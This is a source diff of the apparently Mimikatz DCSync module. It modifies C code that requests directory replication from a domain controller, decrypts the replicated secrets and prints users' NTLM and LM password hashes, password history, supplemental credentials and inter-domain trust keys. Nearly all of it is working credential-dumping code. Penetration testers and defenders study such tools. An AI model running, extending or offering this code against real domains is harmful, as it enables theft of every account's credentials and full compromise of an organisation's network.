@@ -1797,7 +1797,6 @@ NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
 	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
-	LSA_HANDLE hPolicy = NULL;
 	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
 	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
 	RPC_BINDING_HANDLE hBinding;
@@ -1835,7 +1834,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n\n", szUser);
 
-				if(kull_m_rpc_drsr_createBinding(szDc, kuhl_m_lsadump_dcsync_RpcSecurityCallback, &hBinding))
+				if(kull_m_rpc_drsr_createBinding(szDc, &hBinding))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid))
 					{
@@ -1853,7 +1852,13 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 								if(drsStatus == 0)
 								{
 									if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
-										kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain);
+									{
+										if(kull_m_rpc_drsr_ProcessGetNCChangesReply(getChRep.V6.pObjects))
+										{
+											kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain);
+										}
+										else PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
+									}
 									else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion and/or cNumObjects\n");
 									kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
 								}
@@ -1878,30 +1883,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		NetApiBufferFree(cInfo);
 	if(pPolicyDnsDomainInfo)
 		LsaFreeMemory(pPolicyDnsDomainInfo);
-	if(hPolicy)
-		LsaClose(hPolicy);
 
 	return STATUS_SUCCESS;
-}
-
-SecPkgContext_SessionKey kuhl_m_lsadump_dcsync_g_sKey = {0, NULL};
-void RPC_ENTRY kuhl_m_lsadump_dcsync_RpcSecurityCallback(void *Context)
-{
-	RPC_STATUS rpcStatus;
-	SECURITY_STATUS secStatus;
-	PCtxtHandle data = NULL;
-
-	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
-	if(rpcStatus == RPC_S_OK)
-	{
-		if(kuhl_m_lsadump_dcsync_g_sKey.SessionKey)
-		{
-			FreeContextBuffer(kuhl_m_lsadump_dcsync_g_sKey.SessionKey);
-			kuhl_m_lsadump_dcsync_g_sKey.SessionKeyLength = 0;
-			kuhl_m_lsadump_dcsync_g_sKey.SessionKey = NULL;
-		}
-		secStatus = QueryContextAttributes((PCtxtHandle) data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &kuhl_m_lsadump_dcsync_g_sKey);
-	}
 }
 
 PVOID kuhl_m_lsadump_dcsync_findMonoAttr(ATTRBLOCK *attributes, ATTRTYP type, PVOID data, DWORD *size)
@@ -1946,44 +1929,21 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 {
 	DWORD i;
 	BOOL status = FALSE;
-	MD5_CTX md5ctx;
-	CRYPTO_BUFFER cryptoData = {encodedDataSize - 16, encodedDataSize - 16, encodedData + 16}, cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL};
 	BYTE data[LM_NTLM_HASH_LENGTH];
-
-	MD5Init(&md5ctx);
-	MD5Update(&md5ctx, kuhl_m_lsadump_dcsync_g_sKey.SessionKey, kuhl_m_lsadump_dcsync_g_sKey.SessionKeyLength);
-	MD5Update(&md5ctx, encodedData, 16); // salt
-	MD5Final(&md5ctx);
-	cryptoKey.Buffer = md5ctx.digest;
-
-	if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
+	for(i = 0; i < encodedDataSize; i+= LM_NTLM_HASH_LENGTH)
 	{
-		cryptoData.Length = cryptoData.MaximumLength -= 4; // crc
-		cryptoData.Buffer += 4;
-
-		if(rid && prefix)
+		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
+		if(status)
 		{
-			for(i = 0; i < cryptoData.Length; i+= LM_NTLM_HASH_LENGTH)
-			{
-				status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + i, &rid, data));
-				if(status)
-				{
-					if(isHistory)
-						kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
-					else
-						kprintf(L"  Hash %s: ", prefix);
-					kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
-					kprintf(L"\n");
-				}
-				else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
-			}
+			if(isHistory)
+				kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
+			else
+				kprintf(L"  Hash %s: ", prefix);
+			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
+			kprintf(L"\n");
 		}
-		else
-		{
-			status = TRUE;
-		}
+		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
 	}
-	else PRINT_ERROR(L"RtlEncryptDecryptRC4");
 	return status;
 }
 
@@ -1997,19 +1957,76 @@ void kuhl_m_lsadump_dcsync_descrObject(ATTRBLOCK *attributes, LPCWSTR szSrcDomai
 		kuhl_m_lsadump_dcsync_descrTrust(attributes, szSrcDomain);
 }
 
+const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
+	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
+	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
+	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
+	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
+};
+
+LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
+{
+	LPCWSTR target;
+	switch(accountType)
+	{
+	case SAM_DOMAIN_OBJECT:
+		target = L"DOMAIN_OBJECT";
+		break;
+	case SAM_GROUP_OBJECT:
+		target = L"GROUP_OBJECT";
+		break;
+	case SAM_NON_SECURITY_GROUP_OBJECT:
+		target = L"NON_SECURITY_GROUP_OBJECT";
+		break;
+	case SAM_ALIAS_OBJECT:
+		target = L"ALIAS_OBJECT";
+		break;
+	case SAM_NON_SECURITY_ALIAS_OBJECT:
+		target = L"NON_SECURITY_ALIAS_OBJECT";
+		break;
+	case SAM_USER_OBJECT:
+		target = L"USER_OBJECT";
+		break;
+	case SAM_MACHINE_ACCOUNT:
+		target = L"MACHINE_ACCOUNT";
+		break;
+	case SAM_TRUST_ACCOUNT:
+		target = L"TRUST_ACCOUNT";
+		break;
+	case SAM_APP_BASIC_GROUP:
+		target = L"APP_BASIC_GROUP";
+		break;
+	case SAM_APP_QUERY_GROUP:
+		target = L"APP_QUERY_GROUP";
+		break;
+	default:
+		target = L"unknown";
+	}
+	return target;
+}
+
 void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 {
-	DWORD rid = 0;
+	DWORD rid = 0, i;
 	PBYTE encodedData;
 	DWORD encodedDataSize;
 	PVOID data;
-
+	
 	kprintf(L"** SAM ACCOUNT **\n\n");
 	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"SAM Username         : ", attributes, ATT_SAM_ACCOUNT_NAME, TRUE);
 	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"User Principal Name  : ", attributes, ATT_USER_PRINCIPAL_NAME, TRUE);
 	
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SAM_ACCOUNT_TYPE, &data, NULL))
-		kprintf(L"Account Type         : %08x\n", *(PDWORD) data);
+		kprintf(L"Account Type         : %08x ( %s )\n", *(PDWORD) data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD) data));
+
+	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_USER_ACCOUNT_CONTROL, &data, NULL))
+	{
+		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
+		for(i = 0; i < sizeof(DWORD) * 8; i++)
+			if((1 << i) & *(PDWORD) data)
+				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
+		kprintf(L")\n");
+	}
 
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_ACCOUNT_EXPIRES, &data, NULL))
 	{
@@ -2024,7 +2041,7 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 		kull_m_string_displayLocalFileTime((LPFILETIME) data);
 		kprintf(L"\n");
 	}
-
+	
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_OBJECT_SID, &data, NULL))
 	{
 		kprintf(L"Object Security ID   : ");
@@ -2038,7 +2055,6 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
 		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_NT_PWD_HISTORY, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
-
 		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
 		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_LM_PWD_HISTORY, &encodedData, &encodedDataSize))
@@ -2048,8 +2064,7 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
 	{
 		kprintf(L"\nSupplemental Credentials:\n");
-		if(kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, 0, NULL, FALSE))
-			kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) (encodedData + 16 + 4)); // avoid SALT+CRC
+		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
 	}
 }
 
@@ -2165,30 +2180,27 @@ void kuhl_m_lsadump_dcsync_descrTrustAuthentication(ATTRBLOCK *attributes, ATTRT
 
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, type, &encodedData, &encodedDataSize))
 	{
-		if(kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, 0, NULL, FALSE))
+		if(type == ATT_TRUST_AUTH_INCOMING)
 		{
-			if(type == ATT_TRUST_AUTH_INCOMING)
-			{
-				prefix = L"  In ";
-				prefixOld = L" In-1";
-				from = domain;
-				dest = partner;
-			}
-			else
-			{
-				prefix = L" Out ";
-				prefixOld = L"Out-1";
-				from = partner;
-				dest = domain;
-			}
-			authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) (encodedData + 4 + 16);
-			if(authInfos->count)
-			{
-				if(authInfos->offsetToAuthenticationInformation)
-					kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
-				if(authInfos->offsetToPreviousAuthenticationInformation)
-					kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
-			}
+			prefix = L"  In ";
+			prefixOld = L" In-1";
+			from = domain;
+			dest = partner;
+		}
+		else
+		{
+			prefix = L" Out ";
+			prefixOld = L"Out-1";
+			from = partner;
+			dest = domain;
+		}
+		authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) encodedData;
+		if(authInfos->count)
+		{
+			if(authInfos->offsetToAuthenticationInformation)
+				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
+			if(authInfos->offsetToPreviousAuthenticationInformation)
+				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
 		}
 	}
 }
